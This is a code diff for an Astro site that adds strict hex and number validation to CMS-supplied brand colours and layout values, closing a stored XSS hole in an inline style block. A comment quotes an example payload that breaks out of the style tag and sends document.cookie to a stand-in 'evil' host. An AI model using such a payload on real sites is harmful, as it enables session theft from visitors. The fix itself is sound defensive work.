@@ -737,6 +737,38 @@ export interface Brand {
 const DARK_GROUND = '#0b0c10';
 const LIGHT_GROUND = '#faf9f5';
 
+/**
+ * A colour from the CMS, or nothing.
+ *
+ * THIS IS A SECURITY BOUNDARY, and it has to be here rather than in the
+ * Studio schema, for the same reason the redirect checks moved into the build:
+ * Sanity's `validation:` rules run in the Studio UI only. The Content Lake API
+ * does not enforce them, so the hex rule on these fields stops a typo and
+ * stops nothing else.
+ *
+ * Every value below is emitted into a `<style is:inline set:html>` block in
+ * Base.astro, unescaped, on every page of the site. A value of
+ *
+ *   #fff}</style><script>fetch('//evil/'+document.cookie)</script><style>{
+ *
+ * closed the style element and opened a script one. `rule()` does no escaping
+ * — nor should it have to, once nothing but a six-digit hex can reach it.
+ *
+ * Anything that is not exactly `#rrggbb` becomes the empty string, which
+ * `rule()` already drops: the shipped palette from global.css then stands, so
+ * a rejected value degrades to the site's own design rather than to a broken
+ * page.
+ */
+const HEX = /^#[0-9a-fA-F]{6}$/;
+const hexOrEmpty = (value: unknown): string => {
+  const v = typeof value === 'string' ? value.trim() : '';
+  return HEX.test(v) ? v : '';
+};
+
+/** A finite number from the CMS, or null. Same reasoning as `hexOrEmpty`. */
+const numOrNull = (value: unknown): number | null =>
+  typeof value === 'number' && Number.isFinite(value) ? value : null;
+
 const EMPTY_BRAND: Brand = {
   showWordmark: true,
   wordmark: '',
@@ -777,10 +809,11 @@ export async function getBrand(): Promise<Brand> {
     showWordmark: d.showWordmark,
     wordmark: d.wordmark,
     wordmarkSub: d.wordmarkSub,
-    accentDark: d.accentDark,
-    accentLight: d.accentLight,
-    buttonFill: d.buttonFill,
-    buttonInk: d.buttonInk,
+    /* Every one of these reaches an inline <style> unescaped. See hexOrEmpty. */
+    accentDark: hexOrEmpty(d.accentDark),
+    accentLight: hexOrEmpty(d.accentLight),
+    buttonFill: hexOrEmpty(d.buttonFill),
+    buttonInk: hexOrEmpty(d.buttonInk),
 
     palette: Object.fromEntries(
       ([
@@ -802,12 +835,19 @@ export async function getBrand(): Promise<Brand> {
         'inkFaintLight',
         'dangerDark',
         'dangerLight',
-      ] as const).map((k) => [k, String((d as Record<string, unknown>)[k] ?? '')])
+      ] as const).map((k) => [k, hexOrEmpty((d as Record<string, unknown>)[k])])
     ),
+    /*
+     * Coerced, not cast. `as number` is a compile-time assertion and does
+     * nothing at runtime — a string arriving in one of these fields would be
+     * interpolated straight into the inline <style> as `${contentWidth}px`,
+     * which is the same injection the colours above are guarded against. The
+     * Studio declares them as numbers; the API does not enforce that.
+     */
     layout: {
-      contentWidth: (d.contentWidth as number | null) ?? null,
-      radiusScale: (d.radiusScale as number | null) ?? null,
-      gutterScale: (d.gutterScale as number | null) ?? null,
+      contentWidth: numOrNull(d.contentWidth),
+      radiusScale: numOrNull(d.radiusScale),
+      gutterScale: numOrNull(d.gutterScale),
     },
 
     /* Keys in, stacks out. The Studio stores `bricolage`; the site needs the
@@ -850,9 +890,12 @@ export async function getBrand(): Promise<Brand> {
           },
         }
       : {}),
-    themeColor: d.themeColor || DARK_GROUND,
-    themeColorLight: d.themeColorLight || LIGHT_GROUND,
-    backgroundColor: d.backgroundColor,
+    /* Attribute values, so Astro escapes them — but they also feed the web
+       manifest as JSON, and a non-colour here is meaningless everywhere it
+       lands. Same guard, one rule for all colour fields. */
+    themeColor: hexOrEmpty(d.themeColor) || DARK_GROUND,
+    themeColorLight: hexOrEmpty(d.themeColorLight) || LIGHT_GROUND,
+    backgroundColor: hexOrEmpty(d.backgroundColor),
     appName: d.appName,
     appShortName: d.appShortName,
     appDescription: d.appDescription,
